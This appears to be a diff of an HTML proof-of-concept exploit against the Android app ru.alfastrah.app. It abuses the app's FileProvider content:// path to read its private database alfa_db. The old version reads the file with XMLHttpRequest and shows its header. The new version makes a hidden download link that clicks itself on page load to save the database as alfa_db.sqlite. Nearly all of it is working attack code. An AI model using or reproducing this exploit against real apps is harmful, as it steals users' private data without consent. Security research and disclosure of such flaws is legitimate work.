@@ -1,26 +1,8 @@
 <html>
-<body>
-<pre id="out">Loading 2...</pre>
+<body>    
+<a id="dl" href="content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/databases/alfa_db" download="alfa_db.sqlite">.</a>                                                                                                                         
 <script>
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/databases/alfa_db', true);
-xhr.responseType = 'arraybuffer';
-
-xhr.onload = function(e) {
-  if (this.status == 200 || this.status == 0) {
-    var uInt8Array = new Uint8Array(this.response);
-    var header = String.fromCharCode.apply(null, uInt8Array.slice(0, 15));
-    
-    document.getElementById('out').innerText = "SUCCESS! Header: " + header + 
-                                               "\nSize: " + uInt8Array.length + " bytes";
-    
-  }
-};
-
-xhr.onerror = function(e) {
-  document.getElementById('out').innerText = "XHR ERROR: " + e.target.status;
-};
-xhr.send();
+document.getElementById('dl').click();                                                                                                                  
 </script>
 </body>
 </html>
